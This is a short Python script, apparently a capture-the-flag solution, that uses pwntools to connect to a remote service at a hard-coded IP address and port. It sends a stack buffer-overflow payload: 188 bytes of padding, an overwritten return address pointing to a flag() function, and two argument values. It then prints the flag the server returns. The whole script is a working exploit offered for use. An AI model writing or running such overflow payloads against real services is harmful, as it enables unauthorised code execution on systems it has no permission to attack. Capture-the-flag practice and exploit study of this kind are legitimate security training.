from pwn import *
import sys
r = remote("165.22.119.112", 30252)

# Offset, flag(), padding, parameter, parameter
payload = b"A"*188+b"\xe2\x91\x04\x08"+b"\x90\x90\x90\x90"+b"\xef\xbe\xad\xde\x0d\xd0\xde\xc0"
# Receive prompt
r.recv()
# Send payload
r.sendline(payload)
# Receive re-prompt and flag
flag = r.recv()
print(flag)